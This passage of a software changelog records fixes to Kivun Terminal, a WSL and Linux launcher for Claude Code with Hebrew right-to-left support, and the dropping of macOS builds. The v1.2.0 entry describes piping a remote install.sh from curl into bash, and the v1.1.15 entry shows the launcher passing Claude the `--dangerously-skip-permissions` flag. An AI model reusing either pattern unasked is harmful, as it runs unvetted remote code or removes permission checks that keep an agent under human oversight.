- **No per-session temp txt file for flags.** User constraint from this session: *"for flags, txt file is not acceptable"* — referring to the sibling `kivun-terminal` project's pattern of writing one-shot flags into `%LOCALAPPDATA%\Kivun\kivun-claude-flags.txt`. v1.2.7 sets static defaults via `config.txt` instead; per-launch flag overrides (an interactive prompt after the picker) are not implemented.
- **No startup-command auto-typing.** Sibling pattern uses Windows-side WScript SendKeys to type a command into the Claude TUI after launch — that approach cannot reach a process running inside WSL Konsole, so a port would need a Linux-side keystroke injector and a synchronization handshake. Out of scope.

## [1.2.6] - 2026-05-05

Two desktop-shortcut bugs reported on a fresh v1.2.5 install: cancelling the folder picker dropped the user into a minimized cmd window with an invisible `set /p` prompt; and on slower machines two Claude Code windows opened (one in Konsole, one in the launcher's cmd console) because the launcher's `pgrep`-based Konsole-detection raced.

### Fixed: folder picker is now a single dialog with browse + paste

- `payload/folder-picker.wsf` rewritten to use `BIF_NEWDIALOGSTYLE | BIF_EDITBOX` (flag mask 0x50) — Windows' modern folder browser with a labeled text-input field at the bottom of the same dialog. Users can browse the folder tree OR type/paste a Windows path. Cancel silently falls back to `%USERPROFILE%`.
- `payload/kivun-terminal.bat` — removed the cmd-side `:picker_textinput` text-input fallback that v1.2.5 added. That fallback was correct logic but invisible UX: the desktop shortcut launches the .bat with `SW_SHOWMINIMIZED`, so any `set /p` prompt sat in a minimized window the user could not see. All path-collection UI now lives in `folder-picker.wsf` as Win32 dialogs that pop above any minimized parent.

### Fixed: only one Claude Code window opens

- `payload/kivun-terminal.bat` — removed the racy post-launch `pgrep -x konsole` polling and its `:run_direct` fall-through. The polling had a 13-second timeout and on slower systems would return non-zero before Konsole actually registered, so the launcher spawned a SECOND `claude` directly in the parent cmd while Konsole eventually started with its own Claude inside it. The bash launcher (`kivun-launch.sh`) writes its own progress to `BASH_LAUNCH_LOG.txt`, so genuine Konsole failures are still diagnosable from logs. The `.bat` no longer second-guesses; it spawns `kivun-launch.sh` async and exits cleanly. The `:run_direct` label is preserved for hard failures reached via explicit `goto :run_direct` (e.g. Konsole apt-install failure during launch).

### Documentation

- New **"What's included out of the box"** section in the README, advertising the launcher UX (folder picker dialog with browse+paste, right-click menu, statusline, theme, BiDi wrapper, auto-install) before any technical content. Matches the user's request for parity with the sibling `kivun-terminal` README.

## [1.2.5] - 2026-05-05

Two desktop-shortcut bugs reported on a fresh v1.2.4 install: the launcher always opened in `%USERPROFILE%`, never the user's chosen folder; and the 2-line statusline rendered as a single line (project/model/context only, with the session/weekly usage row clipped).

### Fixed: folder picker on the desktop shortcut

- `payload/config.txt`: `FOLDER_PICKER` default flipped from `false` → `true`. The native Windows folder-browse dialog now pops on every desktop-shortcut launch, matching the sibling `kivun-terminal` UX. Right-click "Open with Kivun Terminal" continues to ignore this setting (the right-clicked folder is used directly).
- `payload/kivun-terminal.bat`: the picker block was a nested `(...)` block — `set "WORK_DIR=%PICKED%"` was parse-time-expanded to `WORK_DIR=""` BEFORE `set /p PICKED=<file` ran, so the chosen folder was silently discarded and the launcher's empty-WORK_DIR guard substituted `%USERPROFILE%`. Restructured to flat goto-labelled steps so each `set` evaluates `%VAR%` at runtime. Same trap class as the v1.1.16 `wslpath ""` bug — added a comment in-file to document the fix.

### Fixed: 2-line statusline rendered as 1 line

- `payload/configure-statusline.js`: `padding: 1` → `lines: 2`. `padding` is horizontal-only per the [Claude Code statusline docs](https://code.claude.com/docs/en/statusline) — it does not reserve vertical rows. Empirically verified against the sibling `kivun-terminal` project, which has used `lines: 2` since v2.x and renders both rows.
- `payload/kivun-launch.sh`: per-session settings file (passed to claude via `--settings`) stripped to `{statusLine: {type, command, lines: 2}}`. The previous content carried `outputStyle: "minimal"`, `transcriptVerbosity: "minimal"`, and four `showXxx: false` keys; one or more of those was collapsing the statusline area to a single row even with `lines: 2` set. Matching the sibling's minimal config restored 2-line rendering. Comment in-file warns against re-adding the verbosity keys without re-testing.

### Why this slipped past CI

The launcher CI in `.github/workflows/validate-launcher-windows.yml` exercises Konsole launch + EUID guards + path conversion, but does not assert on the rendered statusline (the test runner has no display). The folder-picker fallback was also untested — the picker pops a native Win32 dialog that headless CI cannot interact with. Both gaps remain; PRs welcome.

## [1.2.4] - 2026-05-03

**macOS support is deprecated.** v1.2.0 → v1.2.3 each tried a different Mac terminal (Apple Terminal → iTerm2 → WezTerm) and each failed at mixed Hebrew + English rendering. This release removes the broken-on-arrival Mac build path. Windows and Linux are unaffected.

### Why deprecate

After v1.2.3 (2026-05-02) shipped a bundled `wezterm.lua` with `bidi_enabled = true` + Kivun light-blue theme, user2 reinstalled and reported Hebrew still broken. Two parallel research tracks (codebase audit + 2026-05 web survey) confirmed:

- **Apple Terminal** — has no BiDi engine. Paragraph alignment cannot be set. Verified by [Claude Code #34134](https://github.com/anthropics/claude-code/issues/34134).
- **iTerm2 3.6.x** — BiDi engine mirrors Hebrew even with `BiDi=1` plist set + wrapper off. [GitLab #1611](https://gitlab.com/gnachman/iterm2/-/issues/1611) is the upstream tracking issue.
- **WezTerm 20240127+** — direction detection works but character shaping does not for mixed scripts. See [wezterm#5423](https://github.com/wezterm/wezterm/discussions/5423) (Arabic letters don't join), [wezterm#6592](https://github.com/wezterm/wezterm/issues/6592). v1.2.3 was the first time we shipped this configuration; v1.2.3 was the test, and the test failed.
- **Kitty / Alacritty / Foot** — no BiDi support. [kitty#2109](https://github.com/kovidgoyal/kitty/issues/2109), [alacritty#663](https://github.com/alacritty/alacritty/issues/663), [foot#756](https://codeberg.org/dnkl/foot/issues/756).
- **"Ghostty RTL fork"** — does not exist as a maintained project. The community mirror (`commandlinetips/ghostty`) is a stale copy with zero original commits. Upstream Ghostty has accepted RTL [in principle](https://github.com/ghostty-org/ghostty/discussions/9774) but has not shipped it.
- **Konsole on macOS via XQuartz** — would require ~600 MB Qt+KDE deps, has HiDPI/clipboard quirks; install footprint and reliability rule it out for a "double-click .pkg" UX.

The honest position: as of 2026-05, **no native macOS terminal renders mixed Hebrew + English correctly inside Claude Code**. Shipping a Mac build that promises Hebrew but cannot deliver it is misleading. Kivun's identity is RTL — an English-only Mac build contradicts the project's reason to exist.

### What's removed

- `mac/build.sh`, `mac/scripts/postinstall`, `mac/scripts/wezterm.lua`, `mac/uninstall.sh`, and `mac/README.md` moved to `mac/_archive/` (preserved with full git history for any future revisit).
- New `mac/README.md` written as a deprecation notice with uninstall pointer.
- `.github/workflows/build-mac.yml` deleted. v1.2.4+ tag pushes will no longer trigger Mac builds; future releases will only attach `Kivun_Terminal_Setup.exe` + `kivun-terminal-linux-*.tar.gz`.
- `kivun-claude-bidi/lib/detect-terminal.js`: `apple-terminal` removed from `KNOWN_TERMINALS` (it was added in v1.2.1; defense-in-depth on iTerm2/WezTerm rejection retained).
- `kivun-claude-bidi/test/capability.test.js`: the `apple-terminal → ok` fixture is now an `apple-terminal → not ok` assertion.
- Root `README.md`, `docs/README.md`, `docs/README_INSTALLATION.md`: capability matrix shows Mac as ❌. Platform badges no longer include macOS. Header tagline updated to "Windows and Linux."
- `docs/TROUBLESHOOTING.md`: deprecation banner added. macOS-specific sections retained for users who need to diagnose or uninstall existing v1.2.x installs.

### What's preserved

- The existing **`Kivun_Terminal_Setup_mac.pkg` on the [v1.2.3 release page](https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.2.3) stays downloadable** for users who installed it and may want to roll back. The release body has a deprecation banner edited in pointing at this v1.2.4 announcement.
- `mac/_archive/uninstall.sh` is the script existing v1.2.x users should run to clean up: `sudo /usr/local/share/kivun-terminal/uninstall.sh` (already deployed by the v1.2.x postinstall to `/usr/local/share/kivun-terminal/`).
- `kivun-claude-bidi` wrapper logic stays shipped in Linux + Windows builds. None of its core algorithm changes in v1.2.4.

### Future re-evaluation

We'll revisit macOS support when an upstream terminal ships verified working BiDi for mixed Hebrew + English. The most likely candidates are upstream Ghostty (no ship date set) and a future WezTerm release that fixes [#5423](https://github.com/wezterm/wezterm/discussions/5423). Track Ghostty's RTL effort at [discussion #9774](https://github.com/ghostty-org/ghostty/discussions/9774).

## [1.2.3] - 2026-05-02

User2 reinstalled v1.2.2 on a clean Mac and reported: WezTerm did open (so the brew auto-install worked), but the window was the default dark theme — not the Kivun light-blue — and Hebrew rendered LTR-mirrored. Root cause: **WezTerm 20240127+ ships with `bidi_enabled = false` by default.** v1.2.2 invoked `wezterm start` with no `--config-file`, so the user got WezTerm's defaults: dark theme + BiDi off.

### Fixed: bundled `wezterm.lua` enables BiDi + Kivun theme

- `mac/scripts/wezterm.lua` (NEW): `bidi_enabled = true`, `bidi_direction = 'AutoLeftToRight'`, plus the Kivun light-blue color scheme (`#C8E6FF` background, `#000000` foreground — same colors the .pkg sets via osascript on Apple Terminal).
- `mac/build.sh` stages it into `build/scripts/`, so it ships inside the `.pkg`.
- `mac/scripts/postinstall` copies it to `/usr/local/share/kivun-terminal/wezterm.lua` alongside `statusline.mjs` and `languages.sh`.
- The desktop launcher's `wezterm)` case now invokes `wezterm --config-file "$WEZTERM_LUA" start --cwd "$FOLDER" -- "$CLAUDE_EXEC" ...`. Falls through to plain `wezterm start` if the file is missing (corrupt install) so the user still gets claude.
- The user's own `~/.config/wezterm/wezterm.lua` is **not touched** — `--config-file` is a per-invocation override that applies only to Kivun-launched WezTerm sessions.

### CI

- `.github/workflows/build-mac.yml`: hard-fail step asserts `wezterm.lua` is staged into `build/scripts/` AND extracted from the `.pkg`, AND that the launcher heredoc references `--config-file "$WEZTERM_LUA"`. Closes the gap that let v1.2.2 ship "WezTerm opens but Hebrew is mirrored."

### Documentation

- `mac/README.md`: lists the bundled `wezterm.lua` as installer step 5, and updates the launcher description to mention `wezterm --config-file ... start --cwd`.

### Known limitations not addressed in v1.2.3

- Inherited from v1.2.2: the `.command` file is opened by Apple Terminal on double-click, so users still see a one-second Apple Terminal flash before WezTerm launches. Cleaning this up needs an `.app` bundle.
- Inherited from v1.2.2: iTerm2 is still selectable via `MAC_TERMINAL=iterm2`. Its 3.6.x BiDi engine is broken; left in for users with custom builds.

## [1.2.2] - 2026-05-02

Hebrew on macOS now works out of the box, with **zero manual install steps and zero config edits**. Driven by `kivun-terminal-rtl-debug.v2.md` (a user-driven investigation of why v1.2.1's RTL "fix" still rendered LTR).

### What was wrong in v1.2.1

- v1.2.1 widened the BiDi wrapper allowlist to accept Apple Terminal, iTerm2, and WezTerm — but iTerm2 and WezTerm have native BiDi engines. Running the wrapper on top of native BiDi double-applies the RLE/PDF marks and Hebrew comes out **mirrored**, exactly the symptom one user reported.
- Apple Terminal cannot do RTL paragraph alignment at all (no BiDi engine). The default `MAC_TERMINAL=terminal` silently shipped a broken-out-of-the-box RTL experience.
- iTerm2 3.6.x's BiDi is broken even with the wrapper off — confirmed empirically by setting `BiDi=1` directly on the profile plist.
- The `wezterm)` branch of the desktop launcher only opened WezTerm in the folder; it never invoked claude.

### Fixed: zero-config WezTerm install

`mac/scripts/postinstall` now:

- Auto-installs WezTerm via `brew install --cask wezterm` (skipped if already installed). WezTerm is the only macOS terminal in our matrix that renders Hebrew correctly.
- Force-sets `MAC_TERMINAL=wezterm` and `KIVUN_BIDI_WRAPPER=off` for both new and existing configs. Existing configs are backed up to `config.txt.bak.pre-v1.2.2` first so users can recover any custom edits. Other keys (`RESPONSE_LANGUAGE`, `TERMINAL_COLOR`, etc.) are preserved.
- Heredoc defaults flipped: new installs ship with `MAC_TERMINAL=wezterm` + `KIVUN_BIDI_WRAPPER=off`.

### Fixed: BiDi wrapper rejects native-BiDi terminals

`kivun-claude-bidi/lib/detect-terminal.js` now keeps Konsole + Apple Terminal in the allowlist but explicitly rejects iTerm2 and WezTerm with a clear error message including a `nativeBidi: true` flag. The error reason names the terminal and tells the launcher to set `KIVUN_BIDI_WRAPPER=off`. Defense-in-depth: even if a user manually flips the wrapper on, the wrapper itself refuses where it would mirror Hebrew.

### Fixed: WezTerm launch path actually launches claude

The desktop launcher's `wezterm)` case now invokes `wezterm start --cwd "$FOLDER" -- "$CLAUDE_EXEC" --append-system-prompt "$LANG_PROMPT" $CLAUDE_FLAGS`. Resolves `wezterm` from `$PATH` first, then falls back to `/opt/homebrew/bin/wezterm`, `/usr/local/bin/wezterm`, and `/Applications/WezTerm.app/Contents/MacOS/wezterm` so the launcher works on Apple Silicon, Intel, and unusual install layouts.

### Fixed: launcher gates wrapper on `MAC_TERMINAL=terminal`

In the desktop `.command`, the wrapper is now selected as `CLAUDE_EXEC` only when `KIVUN_BIDI_WRAPPER=on` AND `MAC_TERMINAL=terminal`. On WezTerm or iTerm2 the launcher falls back to plain `claude` regardless of the user's wrapper toggle — preventing double-application even if a stale config somehow has the wrapper on.

### Fixed: stale comments in `bin/kivun-claude-bidi`

- The `KIVUN_BIDI_FORCE` description is rewritten to reflect that macOS terminals are now in the allowlist (and that two of them are intentionally rejected).
- Removed unreachable "node-pty integration is pending — run with `KIVUN_BIDI_WRAPPER=off` to disable this wrapper until v1.1.0 ships" error block. `lib/wrapper.js` does load and run; the previous text was dead.
- The fallback exit-2 message now points users at `KIVUN_BIDI_WRAPPER=off` instead of stating the wrapper is a stub.

### Documentation

- `mac/README.md`: WezTerm-is-default and the why explained up front; config-key descriptions updated; Known Limitations rewritten to surface that Apple Terminal cannot do RTL alignment.
- Root `README.md`: macOS section adds an italic note that the .pkg auto-installs WezTerm, so RTL works without manual intervention.
- `kivun-terminal-rtl-debug.v2.md` checked into the repo root as the source-of-record for this fix.

### Known limitations not addressed in v1.2.2

- The `.command` file is always opened by Apple Terminal on double-click, so users on `MAC_TERMINAL=wezterm` still see a one-second Apple Terminal flash before the launcher hands off to WezTerm. Cleaning this up needs an `.app` bundle or LaunchServices binding. Tracked for a future release.
- iTerm2 is still selectable via `MAC_TERMINAL=iterm2` in the launcher, even though we've found 3.6.x's BiDi broken. Left in because some users may have a working older or custom build, and the cost of removing the branch is higher than the cost of letting users opt in.

## [1.2.1] - 2026-05-01

Mac RTL fix: the BiDi wrapper now actually engages on macOS Apple Terminal / iTerm2 / WezTerm. Per the brief in `MAC_RTL_FIX_BRIEF.md`.

### Fixed: BiDi wrapper rejected non-Konsole environments

`kivun-claude-bidi/lib/detect-terminal.js` allowlist was Konsole-only; the wrapper exited code 5 before claude spawned on a stock Mac install, which is why Hebrew rendered LTR instead of RTL. Widened the allowlist by `TERM_PROGRAM`: `Apple_Terminal`, `iTerm.app`, `WezTerm`. 4 new fixtures in `kivun-claude-bidi/test/capability.test.js`.

### Mac postinstall

- Stale-config migration: appends missing canonical keys (`KIVUN_BIDI_WRAPPER`, `MAC_TERMINAL`, `TERMINAL_COLOR`, `FOLDER_PICKER`, `CLAUDE_FLAGS`) to existing `~/Library/Application Support/Kivun-Terminal/config.txt` without overwriting user edits - handles users whose config predates a key.
- BiDi self-test: pipes `Hello שלום world` through the Injector and logs `BiDi self-test: PASS|FAIL` to `/tmp/kivun_install.log`. Non-blocking; informational diagnostic.
- Removed dead `TEXT_DIRECTION` config key from the Mac config heredoc and `mac/README.md` config-keys list. The key is parsed by no Mac code path.

### CI

- `.github/workflows/build-mac.yml`: hard-fail step that extracts the launcher heredoc from the postinstall and greps for `kivun-claude-bidi` - closes the "green CI but launcher broken" gap that bit v1.1.0.

### Documentation

- Root `README.md` and `mac/README.md`: bilingual (English + Hebrew, `<div dir="rtl">`) unsigned-pkg install walkthrough - Apple menu → System Settings → Privacy & Security → Allow Anyway.

### Caveat

If `Apple_Terminal` turns out to render Unicode RLE/PDF/RLM marks as visible glyphs (rather than treating them as zero-width directional formatting), this fix will surface as visible black-square boxes around Hebrew runs instead of correct RTL rendering. Pending diagnostic from one user (`sarel-mac-mini`) with that exact symptom; rollback path is gating the `apple-terminal` allowlist entry behind an env var (e.g. `KIVUN_BIDI_WRAPPER_TERMINAL_APP_OK=1`).

## [1.2.0] - 2026-04-28

Auto-install bulletproofing + CI hardening. Single user-visible change: the launcher's Claude auto-install path no longer hangs forever on the new `claude.ai/install.sh` ("native build") that Anthropic shipped 2026-04-27. Path completes in 30-90s and verifies on disk; falls through to npm fallback on failure.

### Fixed: auto-install hang on Anthropic's new install.sh

User-reported (2026-04-27): launcher froze indefinitely at "Auto-installing Claude" on a fresh WSL Ubuntu when AUTO_INSTALL_CLAUDE=yes. CI reproduced the same hang on the same day.

**Final architecture (after 14 working iterations on PR #60):**

- `payload/kivun-install-claude.sh` — static install runner (NEW). Runs `timeout 600 bash -c '<curl + bash install.sh>' > /tmp/kivun-claude.log 2>&1`, writes exit code to `/tmp/kivun-install-rc`.
- `:_do_install` in `payload/kivun-terminal.bat` — invokes the runner via `wsl -d Ubuntu -- setsid -w bash <runner>`. The `setsid -w` (new session + wait) is the critical detail: `setsid` detaches install.sh's forked daemons from wsl.exe's interop relay session so wsl.exe returns cleanly when the install bash exits; `-w` makes setsid synchronous so `%ERRORLEVEL%` carries install.sh's actual exit code.
- No polling, no cmd-side sleep, no detachment. ONE wsl call, blocks for 30-90s, returns.

**Why earlier attempts failed:** v1.1.20 ran the install synchronously without `setsid`, so install.sh's forked daemons (post-install hooks holding the parent stdout fd) kept wsl.exe alive forever. v1.1.21–v1.1.30 tried backgrounded install + cmd-side polling, but a separate root-cause showed up: GitHub Actions runner uses Windows job objects per workflow step, and the launcher cmd was being killed when the "start launcher" step ended. v1.1.31 used `setsid` (no `-w`) so the wsl call returned in 230ms without waiting for install. v1.1.32 added `-w`. v1.1.33 restructured the test to keep the launcher alive in a single bash step. Each false start added a useful piece of historical commentary in the .bat — see comments around `:_do_install` for the full chronology.

### CI coverage added in this release

PR #60 added 4 new jobs to `.github/workflows/validate-launcher-windows.yml`:

- `test-no-claude-accept-install` — exercises auto-install end-to-end (the path that broke for the 2026-04-27 user)
- `test-claude-discovery-from-bashrc` — v1.1.6 active-discovery (PATH from .bashrc/.profile)
- `test-v1115-abort-and-v1116-dot-fallback` — root-refusal abort + WSL_PATH=. fallback
- `test-v1115-routes-through-uid-1000` — UID 1000 fallback when WSLg owner is root/empty
- `test-sh-scripts-refuse-root` — EUID guards in kivun-launch.sh + kivun-direct.sh

All 8 jobs green. Workflow path-triggers expanded to fire on changes to `payload/kivun-launch.sh` + `payload/kivun-direct.sh`.

### Documentation

- `docs/CHANGELOG.md` — collapses the v1.1.19–v1.1.33 development bumps into this single v1.2.0 release entry; the .bat's `:_do_install` comments preserve the full chronology of what was tried.

### Lessons added to launcher-bulletproofing memory

1. `setsid` without `-w` does NOT wait for the program — silent footgun if you want a synchronous wsl call.
2. GitHub Actions runner kills processes per step via Windows job objects. Detached `start /B` children die when the spawning step ends. For tests with slow paths, combine launch + poll into one shell step so the bash job stays alive.
3. `cmd /c "..."` from `shell: bash` works when `MSYS_NO_PATHCONV=1`; never write `cmd //c "..."` (cmd starts interactively, eats stdin).

## [1.1.18] - 2026-04-27

CI coverage added in PR #60 (the `validate-launcher-windows.yml` jobs that exercise the v1.1.14/v1.1.15/v1.1.16 launcher paths) caught a real production bug that no prior release surfaced: **the direct-fallback path runs with empty environment variables when Konsole apt-install fails.**

### Fixed: Konsole-install-fail → silent broken launch (the bug PR #60 caught)

**Symptom:** when `apt-get install -y konsole` failed inside WSL — possible on a CI runner with no GUI, on a flaky apt mirror, on a machine without sudo cached, or behind a network outage — the launcher logged `ERROR - Konsole installation failed`, then `INFO - Falling back to direct Claude execution`, then `INFO - Executing: claude --append-system-prompt`, then `COMPLETE - Claude session ended`. The user saw the launch "succeed" but no Claude window appeared.

**Cause:** the `goto :run_direct` at line 225 of `kivun-terminal.bat` jumped past:
- the path conversion block (which sets `WSL_PATH` and `INST_WSL`)
- the WSLg-user detection block (which sets `WSL_USER_FLAG`)

So `:run_direct` invoked `wsl -d Ubuntu bash kivun-direct.sh "" "<prompt>"` — bash with no `INST_WSL` prefix on the script path. WSL bash inherits cmd's cwd (the Windows install dir, mapped to `/mnt/c/Users/.../AppData/Local/Kivun-WSL/` or wherever cmd was running), looks for `kivun-direct.sh` relative to that cwd, doesn't find it, exits silently. The launcher logs `COMPLETE - Claude session ended` regardless because the wsl invocation's exit code wasn't checked — the same anti-pattern v1.1.1 was supposed to kill but only addressed for the `claude not found` branch.

**Fix:** moved the path conversion + line-ending fix + VcXsrv check + bash log path + WSLg-user detection blocks to **before** the Konsole check in `payload/kivun-terminal.bat`. Now both the Konsole-launch path and the direct-fallback path run with the same fully-resolved `WSL_PATH` / `INST_WSL` / `WSL_USER_FLAG`. As a side benefit, the v1.1.15 abort (no UID 1000 user) now fires before we try to install Konsole, instead of after — so users in that scenario don't watch a 30-second apt run before being told to create a non-root user.

**Why no earlier release caught this:** every prior CI job (`test-no-claude-no-konsole`, `test-existing-claude-no-reinstall`, etc.) either pre-installed Konsole or asserted on the pre-Konsole code path. The new `test-v1115-abort-and-v1116-dot-fallback` and `test-v1115-routes-through-uid-1000` jobs in PR #60 both exercise the **Konsole-install-fail → direct-fallback** path end-to-end, and immediately exposed that the v1.1.16 dot-fallback marker and the v1.1.15 user-detection markers never appeared in the log because the goto jumped over them.

### Lesson learned (added to launcher-bulletproofing memory)

`goto :label` in cmd is a one-way trapdoor. Any code after the call site that the goto jumps over might as well not exist for the post-goto code. When adding new launcher invariants (path conversion, user detection, etc.), put them BEFORE all conditional gotos that lead to paths needing those invariants — not after, with the assumption that the goto path will redo or skip the work. The "happy path runs every line; error paths skip lines" mental model is wrong for cmd.

### CI coverage already covers this fix

PR #60's three new jobs assert the post-fix behavior:
- `test-v1115-abort-and-v1116-dot-fallback`: now reaches the v1.1.16 `Path conversion returned '.'` log line on a `.` arg, and reaches the v1.1.15 abort message when no UID 1000 exists. Both were previously skipped by the goto.
- `test-v1115-routes-through-uid-1000`: now reaches the v1.1.15 `Will run as: kivuntest` log line. Previously skipped.
- `test-sh-scripts-refuse-root`: regex assertion fixed in PR #60 to match the actual `wsl -d Ubuntu --user root -- adduser yourname` message.

After v1.1.18 lands on main, PR #60 will rebase clean and turn green.

## [1.1.17] - 2026-04-27

Two regressions that surfaced from real install testing of v1.1.16. Both were caused by code I shipped in v1.1.16; both are fixed here.

### Fixed: v1.1.16 updater bat shipped LF-endings .bat → cmd silently skipped half the launcher

**Symptom:** users who ran `Kivun-Update-To-V1116.bat` reported the working directory was wrong (landed in `/home/<user>` instead of `%USERPROFILE%`-converted `/mnt/c/Users/<user>`), the icon didn't show, and Claude asked to trust the folder on every launch (because it was a different folder than before).

**Cause (the actual root, found by counting CRs in the deployed file):** the v1.1.16 updater downloaded `kivun-terminal.bat` via `curl -fsSL` from GitHub raw. **GitHub raw serves files with the repository's storage line endings — LF on Linux-flavored repos.** The original NSIS installer wraps shipped files in CRLF, but the updater didn't normalize. Result: the deployed `kivun-terminal.bat` had ALL LF endings (verified: 0 lines with `\r$` out of 658 total). cmd is *partially* tolerant of LF-only `.bat` files — some lines run, some don't — and the symptom is silent. In practice the `WORK_DIR` setup at line 53, the config-file read at line 80, and ~10 other early `:LOG` calls were all skipped, so the launcher fell through to the v1.1.16 path-conversion fallback (`~`) instead of the proper `%USERPROFILE%` branch.

**Fix in v1.1.17 updater:** explicitly normalizes the downloaded `.bat` to CRLF inside WSL via `tr -d '\r' | sed 's/$/\r/'` after `curl`. Belt-and-suspenders fix in `kivun-terminal.bat` itself: when `WORK_DIR` is empty or `.`, substitute `%USERPROFILE%` upstream BEFORE `wslpath` (instead of falling back to `~` after `wslpath` returns `.`). So even if a future updater bug ships LF-endings again, the launcher's surviving fragments still land users at their Windows home, not WSL home.

### Fixed (also retracted v1.1.16's "architectural limit" claim): Konsole window has no taskbar icon under WSLg

**v1.1.16 incorrectly documented the missing taskbar icon as a WSLg architectural limit.** It isn't. WSLg sets the Windows taskbar icon by matching window WM_CLASS (or Wayland app_id) against installed `.desktop` files' `StartupWMClass=` entry — a different mechanism than X11's `_NET_WM_ICON` (which the v1.1.7 path correctly sets but WSLg ignores). Konsole's default WM_CLASS is `konsole`, which matches the system's `org.kde.konsole.desktop` and uses Konsole's bundled icon — NOT ours.

**Fix in v1.1.17 `kivun-launch.sh`:**
1. Generates `~/.local/share/applications/kivun-terminal.desktop` with `Icon=<absolute path to kivun-icon.png>` and `StartupWMClass=kivun-terminal`.
2. Launches Konsole with `--name kivun-terminal` (Qt's WM_CLASS res_name flag).
3. WSLg matches the `kivun-terminal` WM_CLASS to our `.desktop` and uses our PNG for the Windows taskbar icon. Verified working April 27, 2026.

The original `python-xlib` `_NET_WM_ICON` path still runs as a fallback for users on `USE_VCXSRV=true` — VcXsrv reads `_NET_WM_ICON` directly. The two paths are complementary: `.desktop` for WSLg installs (the v1.1+ default), `_NET_WM_ICON` for VcXsrv installs.

### Lesson learned (carried into the launcher-bulletproofing memory entry)

When a doc says something is "architecturally not fixable", check first whether you've explored ALL the platform's mechanisms — not just the one you tried. v1.1.16 declared WSLg icon-setting unfixable based on testing two `_NET_WM_ICON` paths. The actual answer was a third mechanism (`.desktop` + WM_CLASS) that's the *standard* way Linux desktops associate icons with applications. "Not fixable" claims should require active disproof of all known APIs, not "I tried two things and they didn't work."

Also: when shipping an updater that pulls files from GitHub raw, ALWAYS normalize line endings explicitly. The repo-side storage endings are not the same as the installer-bundled endings.

## [1.1.16] - 2026-04-27

Two user-reported issues from real install testing on April 27, 2026.

### Fixed: working directory was the install dir instead of `$HOME` / right-clicked folder

**Symptom:** Konsole opened with the working directory set to `/mnt/c/Users/<you>/AppData/Local/Kivun-WSL` (the Kivun install directory) instead of your home directory or the folder you right-clicked.

**Cause (verified April 27, 2026 in WSL 2.6.3.0):** `wslpath ""` and `wslpath "."` both return the literal `.` string instead of empty. The .bat's check was `if "%WSL_PATH%"==""` (empty only) so a `.` value slipped through, got passed to bash, and `cd .` kept whatever cwd bash inherited from cmd — typically the install dir when launched via the Desktop shortcut.

**Fix:** added `if "%WSL_PATH%"=="."` fallback to the same home-directory-fallback branch in `payload/kivun-terminal.bat`. WORK_DIR upstream is also the harder fix to chase ("who is passing `.` or empty as `%~1`?"), but the defensive check at WSL_PATH covers both `wslpath` quirk cases regardless of upstream cause.

### Investigated and documented: Konsole title-bar/taskbar icon is blank under WSLg

**Symptom:** title bar and Windows taskbar entry for the Konsole window are blank/white instead of showing the orange Claude icon. Logs say `SUCCESS - Window icon set` but visually nothing.

**Diagnosis (verified via xprop on the live window):** the python-xlib path *does* set `_NET_WM_ICON` correctly with all four icon sizes (16/32/48/64) and valid pixel data. Confirmed via `xprop -name "Kivun Terminal" _NET_WM_ICON` showing the orange figure clearly in the ASCII preview. **WSLg's compositor (Weston → RDP → Windows) does not forward `_NET_WM_ICON` to either the title bar or the Windows taskbar.** Tried `--qwindowicon <path>` as a Qt-native alternative (sets the icon at Qt application level before X11 window creation) — also ignored by WSLg.

**Status:** WSLg architectural limit. Not Kivun-fixable. Documented in `docs/TROUBLESHOOTING.md`. **Native Linux KDE/GNOME installs are unaffected** — they show the icon correctly via `_NET_WM_ICON`. Only WSLg installs (most Windows Kivun users) get a blank Konsole-window icon, with the cmd "Launch Log" window keeping its icon from the Windows shortcut `.lnk` file.

The `--qwindowicon` experiment is removed from `payload/kivun-launch.sh` (was added speculatively earlier today) but a comment block remains explaining why we tried it and why it doesn't help, so future agents don't re-derive the failed spike.

### Why two issues were investigated together

User reported them in close succession during v1.1.15 testing. The path issue is the meaningful fix; the icon issue is a documented limit. Bundling both lets the v1.1.16 release ship the path fix immediately AND give a clear "this is what we tried, this is why it can't be fixed from our side" answer for the icon question.

## [1.1.15] - 2026-04-27

v1.1.14 was incomplete. Same user (`mipmip`) re-ran the launcher after the v1.1.14 update and **the same `--dangerously-skip-permissions cannot be used with root/sudo privileges` error happened again**, this time via the *fallback* path. Two bugs missed in v1.1.14:

1. **The WSLG_USER==root branch only triggered when WSLg ownership detection EXPLICITLY returned the string "root".** On mipmip's machine the detection returned **empty** (`WARNING - Could not detect WSLg owner, using default user` in the log), so the fallback never fired. The wsl invocation then ran with no `--user` flag, defaulting to root, where Claude refused.
2. **The direct-fallback path (line 458 of `kivun-terminal.bat`) ran `wsl -d Ubuntu bash kivun-direct.sh ...` with no `--user` flag at all** — bypassing whatever WSL_USER_FLAG the WSLg detection had set. So even if the Konsole launch path used a non-root user, the direct fallback when Konsole failed still went to root.

### Fixed

- **`payload/kivun-terminal.bat` v1.1.15**: simpler, exhaustive WSLG_USER detection. Discard any "root" or empty result; query `wsl --user root -- id -un 1000` to find the conventional first non-root user; if that's also empty, abort with the same copy-paste-able instructions for creating a non-root user. The logic is intentionally **flat** (no nested `if (...)` blocks containing `%VAR%` references) so cmd's parse-time vs runtime variable expansion can't introduce bugs the v1.1.14 nested-if version was vulnerable to.
- **`payload/kivun-terminal.bat` line 458**: direct-fallback path now passes `%WSL_USER_FLAG%` to wsl, mirroring the Konsole launch path. Both paths get the same resolved non-root user.
- **`payload/kivun-direct.sh` v1.1.15 (defense in depth)**: EUID==0 guard mirroring the one v1.1.14 added to `kivun-launch.sh`. If somehow upstream WSL changes break the .bat detection AND the .bat then routes through the direct fallback, this script still refuses to run Claude as root and prints the fix-instructions.

### Lesson learned (carried into the launcher-bulletproofing memory entry and CLAUDE.md note)

When a launcher fix targets a symptom from a single user report, walk through ALL execution paths that lead to the same symptom — not just the one in the bug report. v1.1.14 fixed the symptom for the Konsole-launch path but missed the direct-fallback path. Both could lead the same user to the same red Claude error. CI tests (`validate-launcher-windows.yml`) only exercise the Konsole-launch path because that's the happy path; the fallback path needs explicit consideration.

Also: cmd's parse-time `%VAR%` expansion inside `if (...) (...)` blocks bites every time. Use flat top-level statements when each step modifies the variable being checked.

## [1.1.14] - 2026-04-27

